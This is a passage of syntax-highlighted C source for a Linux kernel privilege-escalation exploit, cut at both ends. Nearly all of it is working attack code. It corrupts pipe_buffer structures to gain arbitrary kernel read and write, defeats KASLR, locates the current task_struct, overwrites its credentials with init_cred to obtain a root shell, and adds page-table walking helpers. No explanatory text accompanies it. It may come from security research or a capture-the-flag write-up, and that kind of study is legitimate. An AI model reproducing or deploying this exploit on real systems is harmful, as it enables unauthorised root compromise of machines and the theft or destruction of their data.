corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x070</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x070</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-57</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-56</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-57</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-50</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-50</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">363</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">377</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">363</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">364</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">377</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br><br><span class="hljs-type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;<br><span class="hljs-type">size_t</span> stack_addr, stack_addr_another;<br><span class="hljs-type">size_t</span> stack_page, mm_struct_page;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve_for_3_level</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    <span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span 